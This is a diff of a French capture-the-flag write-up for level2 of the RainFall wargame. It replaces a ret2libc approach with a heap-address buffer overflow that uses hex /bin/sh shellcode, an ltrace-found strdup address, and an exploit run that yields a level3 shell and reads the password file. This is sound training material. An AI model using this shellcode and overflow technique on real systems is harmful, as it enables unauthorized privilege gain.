@@ -56,7 +56,7 @@ level2@RainFall:~$
 
 La difference avec le niveau precedent c'est que cet executable possede une protection sur l'adresse de retour commencant par `0xb.......` qui se situe dans la stack.
 
-Une des manieres pour passer ce niveau est donc la technique de `ret2libc` qui consiste a controler le flux de retour du programme pour executer des fonctions de la libc charger dans la memoire pour executer un shell
+Une des manieres pour passer ce niveau est de faire un buffer overflow contenant un shellcode et d'ecraser l'adresse de `EIP` par l'adresse du buffer alloue sur la heap grace a la fonction `strdup` qui se retrouve plus bas que la stack et donc contourner la condition de check de l'adresse
 
 Meme si on peut voir que le compilateur etends la stack frame de `0x68` qui est 104 octets, commencons par trouver le offset pour atteindre le registre `EIP` en utilisant [ce site](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)
 
@@ -71,34 +71,25 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb)
 ```
 
-Maintenant qu'on connait la taille de notre offset, il nous reste plus qu'a construire notre stack a faire executer. Elle sera composer de
+Maintenant qu'on connait la taille de notre offset il nous reste a trouver un shellcode qui execute un shell et l'adresse du buffer dans la heap
 
-```
-[BUFFER] [ADRESSE DE RETOUR DU MAIN] [ADRESSE DE SYSTEM] [ADRESSE D'EXIT] [ARGUMENT POUR SYSTEM]
-```
+Pour le shellcode:
+`\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80`
 
-Pour trouver leur adresse respective on peut utiliser `gdb`
-
+Pour l'adresse:
 ```bash
-(gdb) find __libc_start_main,+99999999,"/bin/sh"
-0xb7f8cc58
-warning: Unable to access target memory at 0xb7fd3160, halting search.
-1 pattern found.
-(gdb) p system
-$3 = {<text variable, no debug info>} 0xb7e6b060 <system>
-(gdb) p exit
-$4 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
-(gdb) 
+level2@RainFall:~$ ltrace ./level2 <<< buffer
+strdup("buffer") = 0x0804a008
 ```
 
 Une fois notre `exploit.py` envoyer dans la VM et executer avec le payload generer on peut avoir acces a un shell au niveau 3
 
 ```bash
-level2@RainFall:~$ python /tmp/exploit.py > /tmp/payload
-level2@RainFall:~$ cat /tmp/payload - | ./level2 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAK`�����X���
+level2@RainFall:~$ (python /tmp/exploit.py; cat) | ./level2
+1���
+    Qh//shh/bin��̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
 whoami
 level3
 cat /home/user/level3/.pass
-***********************************************
+**************************************************************
 ```
